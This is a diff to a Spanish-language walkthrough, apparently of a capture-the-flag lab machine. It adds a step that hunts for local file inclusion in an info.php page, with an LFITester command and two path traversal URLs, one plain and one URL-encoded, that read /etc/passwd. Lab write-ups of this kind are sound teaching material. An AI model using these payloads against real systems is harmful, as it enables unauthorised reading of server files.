@@ -57,3 +57,20 @@ Al inspeccionar el código del archivo `info.php`, indica en un comentario que e
 curl http://192.168.1.10/antibot_image/antibots/info.php
 ```
 ![7](https://user-images.githubusercontent.com/75953873/174932206-434978d3-3417-4eb4-bd3f-cbce7b934c87.png)
+
+- *Paso 5:* Búsqueda de vulnerabilidad LFI (Inclusión de archivos locales).
+
+Herramienta Tester: https://github.com/kostas-pa/LFITester
+
+```
+python3 LFITester.py --url "http://192.168.1.10/antibot_image/antibots/info.php?image="
+```
+![8](https://user-images.githubusercontent.com/75953873/174933626-66285afb-399e-4266-9317-9f0beccbda36.png)
+
+URL: 
+```
+Opción 1) http://192.168.1.10/antibot_image/antibots/info.php?image=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+
+Opción 2) http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../etc/passwd
+```
+![9](https://user-images.githubusercontent.com/75953873/174934453-b1182f6c-2ce0-4028-8947-d357988b8c4d.png)
